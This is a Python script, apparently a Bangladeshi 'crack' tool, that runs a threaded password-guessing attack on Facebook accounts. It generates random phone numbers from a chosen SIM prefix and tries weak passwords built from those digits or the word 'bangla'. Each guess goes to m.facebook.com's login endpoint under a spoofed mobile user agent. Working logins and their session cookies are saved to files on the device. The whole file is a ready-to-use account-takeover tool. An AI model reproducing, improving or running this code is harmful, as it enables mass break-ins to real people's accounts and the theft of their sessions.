import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
os.system('clear')
os.system('xdg-open https://youtube.com/@abfoysaltech1020')
logo =("""
\33[38;5;196m███████╗ ██████╗ ██╗   ██╗███████╗ █████╗ ██╗\33[38;5;196m 
\33[38;5;196m██╔════╝██╔═══██╗╚██╗ ██╔╝██╔════╝██╔══██╗██║\33[38;5;196m
\33[38;5;196m█████╗  ██║   ██║ ╚████╔╝ ███████╗███████║██║\33[38;5;196m
\33[38;5;196m██╔══╝  ██║   ██║  ╚██╔╝  ╚════██║██╔══██║██║\33[38;5;196m
\33[38;5;196m██║     ╚██████╔╝   ██║   ███████║██║  ██║███████╗\33[38;5;196m
\33[38;5;196m╚═╝      ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝\33[38;5;196m
\033[1;91m\033[1;41m\033[1;97m     SUBSCRIBE MY CHANNEL: AB FOYSAL TECH       \033[;0m\033[1;91m\033[1;92m
  \033[38;5;46m ┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mAUTHOR     \033[38;5;46m:  \033[1;97mFOYSAL            \033[38;5;46m│
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mFACEBOOK   \033[38;5;46m:  \033[1;97mPAGE- DARK FIRE10 \033[38;5;46m│
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mWHATSAPP   \033[38;5;46m:  \033[1;97m+880- INBOX ME    \033[38;5;46m│
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mGITHUB     \033[38;5;46m:  \033[1;97mAB-DF10           \033[38;5;46m│
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mSTATUS     \033[38;5;46m:  \033[1;97mFREE              \033[38;5;46m│
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mWORKS      \033[38;5;46m:  \033[1;97mDATA & WIFI       \033[38;5;46m│
  \033[38;5;46m │\033[1;30m[\x1b[38;5;196m•\033[1;30m] \033[1;97mFROM       \033[38;5;46m:  \033[1;97mBANGLADESH        \033[38;5;46m│
  \033[38;5;46m └━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n""") 
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://chat.whatsapp.com/DAGPkhdr8Xj8YWZwcLTwLA')
    print(logo)
    print('[+] SIM CODE BD=> 016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as MUEOR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID WAS LOCKED & WAIT FOR OK ID')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY FOYSAL JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            MUEOR.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sFOYSAL\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
            'authority': 'm.facebook.com',
  		  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
		    'cache-control': 'max-age=0',
  		  'sec-ch-prefers-color-scheme': 'light',
  		  'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
   		 'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
   		 'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
   		 'sec-ch-ua-platform-version': '"11.0.0"',
  		  'sec-fetch-dest': 'document',
  		  'sec-fetch-mode': 'navigate',
 		   'sec-fetch-site': 'none',
   		 'sec-fetch-user': '?1',
  		  'upgrade-insecure-requests': '1',
		    'user-agent': pro}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[FOYSAL OK] [💙] {uid} • {ps}" '  \n\033[1;33m [🌺]\033[1;33m [COOKIE]= \033[1;32m'+coki+  ' \n\033[1;33m [⚡] \033[1;32m[USER AGENT]= \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/FOYSAL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[FOYSAL-CP💔] {uid} • {ps}")
                open('/sdcard/FOYSAL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()